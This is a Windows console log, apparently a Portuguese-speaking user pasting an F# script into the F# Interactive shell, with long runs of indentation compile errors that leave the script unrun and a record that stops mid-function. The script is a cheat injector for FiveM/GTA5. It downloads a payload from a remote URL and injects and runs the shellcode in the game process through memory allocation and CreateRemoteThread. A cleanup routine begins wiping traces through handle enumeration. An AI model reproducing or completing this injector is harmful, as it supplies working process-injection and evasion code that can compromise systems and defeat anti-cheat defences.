Microsoft Windows [versão 10.0.19045.6466]
(c) Microsoft Corporation. Todos os direitos reservados.

C:\Windows\system32>dotnet fsi

Microsoft (R) F# Interativo versão 13.9.303.0 para F# 9.0
Copyright (C) Microsoft Corporation. Todos os direitos reservados.

Para ajuda digite #help;;

> open System
- open System.Runtime.InteropServices
- open System.Diagnostics
- open System.Threading
- open System.Net
- open System.Net.Http
-
- let PROCESS_ALL_ACCESS = 0x1FFFFFu
- let PROCESS_DUP_HANDLE = 0x0040u
- let PROCESS_QUERY_INFORMATION = 0x0400u
- let MEM_COMMIT = 0x1000u
- let MEM_RESERVE = 0x2000u
- let PAGE_READWRITE = 0x04u
- let PAGE_EXECUTE_READ = 0x20u
- let THREAD_ACCESS = 0x0010u ||| 0x0002u ||| 0x0040u ||| 0x0008u
- let VK_SHIFT = 0x10
- let VK_F1 = 0x70
- let VK_F2 = 0x71
- let VK_F3 = 0x72
- let SystemHandleInformation = 16u
-
- [<Struct; StructLayout(LayoutKind.Sequential)>]
- type SYSTEM_HANDLE_TABLE_ENTRY_INFO =
-     val mutable UniqueProcessId: uint16
-     val mutable CreatorBackTraceIndex: uint16
-     val mutable ObjectTypeIndex: uint8
-     val mutable HandleAttributes: uint8
-     val mutable HandleValue: uint16
-     val mutable Object_: IntPtr
-     val mutable GrantedAccess: uint32
-
- [<Struct; StructLayout(LayoutKind.Sequential)>]
- type THREADENTRY32 =
-     val mutable dwSize: uint32
-     val mutable cntUsage: uint32
-     val mutable th32ThreadID: uint32
-     val mutable th32OwnerProcessID: uint32
-     val mutable tpBasePri: int32
-     val mutable tpDeltaPri: int32
-     val mutable dwFlags: uint32
-     new(init: unit) = {
-         dwSize = uint32(Marshal.SizeOf(typeof<THREADENTRY32>))
-         cntUsage = 0u; th32ThreadID = 0u; th32OwnerProcessID = 0u
-         tpBasePri = 0; tpDeltaPri = 0; dwFlags = 0u
-     }
-
- [<DllImport("ntdll.dll")>] extern int NtQuerySystemInformation(uint32, IntPtr, uint32, uint32&)
- [<DllImport("ntdll.dll")>] extern int NtClose(IntPtr)
- [<DllImport("ntdll.dll")>] extern int NtTerminateThread(IntPtr, uint32)
- [<DllImport("ntdll.dll")>] extern int NtSetInformationThread(IntPtr, uint32, IntPtr, uint32)
- [<DllImport("ntdll.dll")>] extern int NtAllocateVirtualMemory(IntPtr, IntPtr&, UIntPtr, uint32&, uint32, uint32)
- [<DllImport("ntdll.dll")>] extern int NtWriteVirtualMemory(IntPtr, IntPtr, byte[], uint32, uint32&)
- [<DllImport("ntdll.dll")>] extern int NtProtectVirtualMemory(IntPtr, IntPtr&, uint32&, uint32, uint32&)
- [<DllImport("ntdll.dll")>] extern int NtFreeVirtualMemory(IntPtr, IntPtr&, uint32&, uint32)
- [<DllImport("kernel32.dll", SetLastError=true)>] extern IntPtr OpenProcess(uint32, bool, uint32)
- [<DllImport("kernel32.dll", SetLastError=true)>] extern bool CloseHandle(IntPtr)
- [<DllImport("kernel32.dll", SetLastError=true)>] extern IntPtr VirtualAllocEx(IntPtr, IntPtr, uint32, uint32, uint32
)
- [<DllImport("kernel32.dll", SetLastError=true)>] extern bool WriteProcessMemory(IntPtr, IntPtr, byte[], uint32, uint
32&)
- [<DllImport("kernel32.dll", SetLastError=true)>] extern bool VirtualProtectEx(IntPtr, IntPtr, uint32, uint32, uint32
&)
- [<DllImport("kernel32.dll", SetLastError=true)>] extern IntPtr CreateRemoteThread(IntPtr, IntPtr, uint32, IntPtr, In
tPtr, uint32, IntPtr)
- [<DllImport("kernel32.dll", SetLastError=true)>] extern IntPtr GetProcAddress(IntPtr, string)
- [<DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Ansi)>] extern IntPtr LoadLibraryA(string)
- [<DllImport("kernel32.dll", SetLastError=true)>] extern IntPtr CreateToolhelp32Snapshot(uint32, uint32)
- [<DllImport("kernel32.dll", SetLastError=true)>] extern bool Thread32First(IntPtr, THREADENTRY32&)
- [<DllImport("kernel32.dll", SetLastError=true)>] extern bool Thread32Next(IntPtr, THREADENTRY32&)
- [<DllImport("kernel32.dll", SetLastError=true)>] extern IntPtr OpenThread(uint32, bool, uint32)
- [<DllImport("kernel32.dll", SetLastError=true)>] extern bool SetThreadPriority(IntPtr, int)
- [<DllImport("kernel32.dll", SetLastError=true)>] extern uint32 SuspendThread(IntPtr)
- [<DllImport("kernel32.dll", SetLastError=true)>] extern bool Beep(uint32, uint32)
- [<DllImport("user32.dll")>] extern int16 GetAsyncKeyState(int)
-
- let DownloadPayload (url: string) =
-     let u = url.Replace("/blob/", "/raw/refs/heads/")
-     use h = new HttpClientHandler(UseProxy = false)
-     use c = new HttpClient(h, Timeout = TimeSpan.FromSeconds(60.0))
-     c.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0")
-     let d = c.GetByteArrayAsync(u).Result
-     d
-
- let Countdown (seconds: int) =
-     for i in seconds .. -1 .. 1 do
-         Console.Write(sprintf "\r  [*] Aguarde %d segundos... " i)
-         Thread.Sleep(1000)
-     Console.WriteLine("\r  [+] Pronto! Pode apertar INSERT!                    ")
-
- let DoInject (pid: uint32) (shellcode: byte[]) =
-     let hp = OpenProcess(PROCESS_ALL_ACCESS, false, pid)
-     if hp = IntPtr.Zero then failwith "Admin"
-     let hKernel32 = LoadLibraryA("kernel32.dll")
-     let pSleep = GetProcAddress(hKernel32, "Sleep")
-     let sb = [|0x48uy;0xC7uy;0xC1uy;0xFFuy;0xFFuy;0xFFuy;0xFFuy;0xFFuy;0x15uy;0x02uy;0x00uy;0x00uy;0x00uy;0xEBuy;0xF
7uy|]
-     let sw = Array.zeroCreate<byte> (sb.Length + 8)
-     Array.Copy(sb, sw, sb.Length)
-     Array.Copy(BitConverter.GetBytes(pSleep.ToInt64()), 0, sw, sb.Length, 8)
-     let mutable sa = IntPtr.Zero; let mutable ss = 4096u
-     NtAllocateVirtualMemory(hp, &sa, UIntPtr.Zero, &ss, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE) |> ignore

      NtAllocateVirtualMemory(hp, &sa, UIntPtr.Zero, &ss, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE) |> ignore
  ----^^^^^^^^^^^^^^^^^^^^^^^

stdin(96,5): error FS0010: identificador inesperado em expressão. palavra-chave 'in' ou outro token são esperados.


      NtAllocateVirtualMemory(hp, &sa, UIntPtr.Zero, &ss, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE) |> ignore
  ---------------------------^

stdin(96,28): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      NtAllocateVirtualMemory(hp, &sa, UIntPtr.Zero, &ss, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE) |> ignore
  --------------------------------------------------------------------------------------------------^

stdin(96,99): error FS0010: símbolo ')' inesperado em interação. ';', ';;' ou outro token são esperados.

-     let mutable w = 0u; NtWriteVirtualMemory(hp, sa, sw, uint32(sw.Length), &w) |> ignore

      let mutable w = 0u; NtWriteVirtualMemory(hp, sa, sw, uint32(sw.Length), &w) |> ignore
  ----^^^

stdin(97,5): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      let mutable w = 0u; NtWriteVirtualMemory(hp, sa, sw, uint32(sw.Length), &w) |> ignore
  --------^^^^^^^

stdin(97,9): error FS0010: palavra-chave 'mutable' inesperado em interação


      let mutable w = 0u; NtWriteVirtualMemory(hp, sa, sw, uint32(sw.Length), &w) |> ignore
  --------------------^^

stdin(97,21): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>     let mutable op = 0u; NtProtectVirtualMemory(hp, &sa, &ss, PAGE_EXECUTE_READ, &op) |> ignore

      let mutable op = 0u; NtProtectVirtualMemory(hp, &sa, &ss, PAGE_EXECUTE_READ, &op) |> ignore
  ----^^^

stdin(98,5): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.


      let mutable op = 0u; NtProtectVirtualMemory(hp, &sa, &ss, PAGE_EXECUTE_READ, &op) |> ignore
  ---------------------^^

stdin(98,22): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>     let hStub = CreateRemoteThread(hp, IntPtr.Zero, 0u, sa, IntPtr.Zero, 0u, IntPtr.Zero)

      let hStub = CreateRemoteThread(hp, IntPtr.Zero, 0u, sa, IntPtr.Zero, 0u, IntPtr.Zero)
  ----^^^

stdin(99,5): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.


      let hStub = CreateRemoteThread(hp, IntPtr.Zero, 0u, sa, IntPtr.Zero, 0u, IntPtr.Zero)
  ----------------^^^^^^^^^^^^^^^^^^

stdin(99,17): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      let hStub = CreateRemoteThread(hp, IntPtr.Zero, 0u, sa, IntPtr.Zero, 0u, IntPtr.Zero)
  ----------------------------------^

stdin(99,35): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

-     Console.WriteLine("  [+] [STUB] Criada")

      Console.WriteLine("  [+] [STUB] Criada")
  ---------------------^

stdin(100,22): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      Console.WriteLine("  [+] [STUB] Criada")
  -------------------------------------------^

stdin(100,44): error FS0010: símbolo ')' inesperado em interação. ';', ';;' ou outro token são esperados.

-     let mutable a = IntPtr.Zero; let mutable z = uint32(shellcode.Length + 0x1000)

      let mutable a = IntPtr.Zero; let mutable z = uint32(shellcode.Length + 0x1000)
  ----^^^

stdin(101,5): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      let mutable a = IntPtr.Zero; let mutable z = uint32(shellcode.Length + 0x1000)
  --------^^^^^^^

stdin(101,9): error FS0010: palavra-chave 'mutable' inesperado em interação


      let mutable a = IntPtr.Zero; let mutable z = uint32(shellcode.Length + 0x1000)
  --------------------^^^^^^

stdin(101,21): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      let mutable a = IntPtr.Zero; let mutable z = uint32(shellcode.Length + 0x1000)
  ---------------------------------^^^

stdin(101,34): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

-     NtAllocateVirtualMemory(hp, &a, UIntPtr.Zero, &z, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE) |> ignore

      NtAllocateVirtualMemory(hp, &a, UIntPtr.Zero, &z, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE) |> ignore
  ---------------------------^

stdin(102,28): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      NtAllocateVirtualMemory(hp, &a, UIntPtr.Zero, &z, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE) |> ignore
  ------------------------------------------------------------------------------------------------^

stdin(102,97): error FS0010: símbolo ')' inesperado em interação. ';', ';;' ou outro token são esperados.

-     let mutable off = 0

      let mutable off = 0
  ----^^^

stdin(103,5): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      let mutable off = 0
  --------^^^^^^^

stdin(103,9): error FS0010: palavra-chave 'mutable' inesperado em interação


      let mutable off = 0
  ----------------------^

stdin(103,23): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>     while off < shellcode.Length do

      while off < shellcode.Length do
  ----^^^^^

stdin(104,5): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.


      while off < shellcode.Length do
  ---------------------------------^^

stdin(104,34): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>         let sz = min 512 (shellcode.Length - off)

          let sz = min 512 (shellcode.Length - off)
  --------^^^

stdin(105,9): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.


          let sz = min 512 (shellcode.Length - off)
  -----------------^^^

stdin(105,18): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
          let sz = min 512 (shellcode.Length - off)
  -------------------------^

stdin(105,26): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

-         let ch = Array.zeroCreate<byte> sz; Array.Copy(shellcode, off, ch, 0, sz)

          let ch = Array.zeroCreate<byte> sz; Array.Copy(shellcode, off, ch, 0, sz)
  --------^^^

stdin(106,9): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
          let ch = Array.zeroCreate<byte> sz; Array.Copy(shellcode, off, ch, 0, sz)
  -----------------^^^^^

stdin(106,18): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.


          let ch = Array.zeroCreate<byte> sz; Array.Copy(shellcode, off, ch, 0, sz)
  ---------------------------------^

stdin(106,34): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>         let mutable w2 = 0u; NtWriteVirtualMemory(hp, IntPtr(a.ToInt64() + int64(off)), ch, uint32(sz), &w2) |> igno
re

          let mutable w2 = 0u; NtWriteVirtualMemory(hp, IntPtr(a.ToInt64() + int64(off)), ch, uint32(sz), &w2) |> ignore
  --------^^^

stdin(107,9): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.


          let mutable w2 = 0u; NtWriteVirtualMemory(hp, IntPtr(a.ToInt64() + int64(off)), ch, uint32(sz), &w2) |> ignore
  -------------------------^^

stdin(107,26): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>         off <- off + sz
-     let mutable pa = a; let mutable ps = uint32(shellcode.Length)

      let mutable pa = a; let mutable ps = uint32(shellcode.Length)
  ----^^^

stdin(109,5): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.


      let mutable pa = a; let mutable ps = uint32(shellcode.Length)
  ---------------------^

stdin(109,22): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      let mutable pa = a; let mutable ps = uint32(shellcode.Length)
  ------------------------^^^

stdin(109,25): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

-     NtProtectVirtualMemory(hp, &pa, &ps, PAGE_EXECUTE_READ, &op) |> ignore

      NtProtectVirtualMemory(hp, &pa, &ps, PAGE_EXECUTE_READ, &op) |> ignore
  --------------------------^

stdin(110,27): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      NtProtectVirtualMemory(hp, &pa, &ps, PAGE_EXECUTE_READ, &op) |> ignore
  ---------------------------------------------------------------^

stdin(110,64): error FS0010: símbolo ')' inesperado em interação. ';', ';;' ou outro token são esperados.

-     let hCheat = CreateRemoteThread(hp, IntPtr.Zero, 0u, a, IntPtr.Zero, 0u, IntPtr.Zero)

      let hCheat = CreateRemoteThread(hp, IntPtr.Zero, 0u, a, IntPtr.Zero, 0u, IntPtr.Zero)
  ----^^^

stdin(111,5): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      let hCheat = CreateRemoteThread(hp, IntPtr.Zero, 0u, a, IntPtr.Zero, 0u, IntPtr.Zero)
  -----------------^^^^^^^^^^^^^^^^^^

stdin(111,18): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

-     Console.WriteLine("  [+] [EXEC] Cheat rodando!")

      Console.WriteLine("  [+] [EXEC] Cheat rodando!")
  ---------------------^

stdin(112,22): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      Console.WriteLine("  [+] [EXEC] Cheat rodando!")
  ---------------------------------------------------^

stdin(112,52): error FS0010: símbolo ')' inesperado em interação. ';', ';;' ou outro token são esperados.

-     Thread.Sleep(1000)

      Thread.Sleep(1000)
  ----------------^

stdin(113,17): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      Thread.Sleep(1000)
  ---------------------^

stdin(113,22): error FS0010: símbolo ')' inesperado em interação. ';', ';;' ou outro token são esperados.

-     let mutable cw = 0u; NtWriteVirtualMemory(hp, a, Array.zeroCreate<byte> 4096, 4096u, &cw) |> ignore

      let mutable cw = 0u; NtWriteVirtualMemory(hp, a, Array.zeroCreate<byte> 4096, 4096u, &cw) |> ignore
  ----^^^

stdin(114,5): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      let mutable cw = 0u; NtWriteVirtualMemory(hp, a, Array.zeroCreate<byte> 4096, 4096u, &cw) |> ignore
  --------^^^^^^^

stdin(114,9): error FS0010: palavra-chave 'mutable' inesperado em interação


      let mutable cw = 0u; NtWriteVirtualMemory(hp, a, Array.zeroCreate<byte> 4096, 4096u, &cw) |> ignore
  ---------------------^^

stdin(114,22): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>     hp, a, sa, hStub, hCheat
-
- let FullCleanup (pid: uint32) (addr: IntPtr) (stubAddr: IntPtr) (hp: IntPtr) =

  let FullCleanup (pid: uint32) (addr: IntPtr) (stubAddr: IntPtr) (hp: IntPtr) =
  ^^^

stdin(117,1): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.


  let FullCleanup (pid: uint32) (addr: IntPtr) (stubAddr: IntPtr) (hp: IntPtr) =
  ----------------^

stdin(117,17): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
  let FullCleanup (pid: uint32) (addr: IntPtr) (stubAddr: IntPtr) (hp: IntPtr) =
  --------------------^

stdin(117,21): error FS0010: símbolo ':' inesperado em interação. ';', ';;' ou outro token são esperados.


  let FullCleanup (pid: uint32) (addr: IntPtr) (stubAddr: IntPtr) (hp: IntPtr) =
  ------------------------------^

stdin(117,31): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
  let FullCleanup (pid: uint32) (addr: IntPtr) (stubAddr: IntPtr) (hp: IntPtr) =
  -----------------------------------^

stdin(117,36): error FS0010: símbolo ':' inesperado em interação. ';', ';;' ou outro token são esperados.

-     Console.WriteLine("")

      Console.WriteLine("")
  ----^^^^^^^

stdin(118,5): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      Console.WriteLine("")
  ---------------------^

stdin(118,22): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

-     Console.ForegroundColor <- ConsoleColor.Yellow
-     Console.WriteLine("  [+] [Shift+F2] LIMPANDO VESTIGIOS...")

      Console.WriteLine("  [+] [Shift+F2] LIMPANDO VESTIGIOS...")
  ---------------------^

stdin(120,22): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      Console.WriteLine("  [+] [Shift+F2] LIMPANDO VESTIGIOS...")
  --------------------------------------------------------------^

stdin(120,63): error FS0010: símbolo ')' inesperado em interação. ';', ';;' ou outro token são esperados.

-     Console.ResetColor()

      Console.ResetColor()
  ----------------------^

stdin(121,23): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      Console.ResetColor()
  -----------------------^

stdin(121,24): error FS0010: símbolo ')' inesperado em interação

-     let names = [|"Fivem"; "FiveM"; "GTA5"|]

      let names = [|"Fivem"; "FiveM"; "GTA5"|]
  ----^^^

stdin(122,5): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      let names = [|"Fivem"; "FiveM"; "GTA5"|]
  ----------------^^

stdin(122,17): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.


      let names = [|"Fivem"; "FiveM"; "GTA5"|]
  ----------------^^

stdin(122,17): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      let names = [|"Fivem"; "FiveM"; "GTA5"|]
  ------------------------------------------^^

stdin(122,43): error FS0010: símbolo '|]' inesperado em interação. ';', ';;' ou outro token são esperados.

-     for name in names do

      for name in names do
  ----^^^

stdin(123,5): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (95:35). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      for name in names do
  -------------^^

stdin(123,14): warning FS0058: O recuo deste token 'in' é incorreto em relação ao 'let' correspondente


      for name in names do
  -------------^^

stdin(123,14): error FS0010: palavra-chave 'in' inesperado em interação. ';', ';;' ou outro token são esperados.

-         if Process.GetProcessesByName(name).Length > 0 then
-             let hd = OpenProcess(PROCESS_DUP_HANDLE ||| PROCESS_QUERY_INFORMATION, false, pid)
-             if hd <> IntPtr.Zero then
-                 let mutable size = 0x200000u; let mutable buffer = Marshal.AllocHGlobal(int size)
-                 let mutable needed = 0u

                  let mutable needed = 0u
  ----------------^^^

stdin(128,17): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
                  let mutable needed = 0u
  --------------------^^^^^^^

stdin(128,21): error FS0010: palavra-chave 'mutable' inesperado em interação


                  let mutable needed = 0u
  -------------------------------------^^

stdin(128,38): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>                 let mutable status = NtQuerySystemInformation(SystemHandleInformation, buffer, size, &needed)

                  let mutable status = NtQuerySystemInformation(SystemHandleInformation, buffer, size, &needed)
  ----------------^^^

stdin(129,17): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.


                  let mutable status = NtQuerySystemInformation(SystemHandleInformation, buffer, size, &needed)
  -------------------------------------^^^^^^^^^^^^^^^^^^^^^^^^

stdin(129,38): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

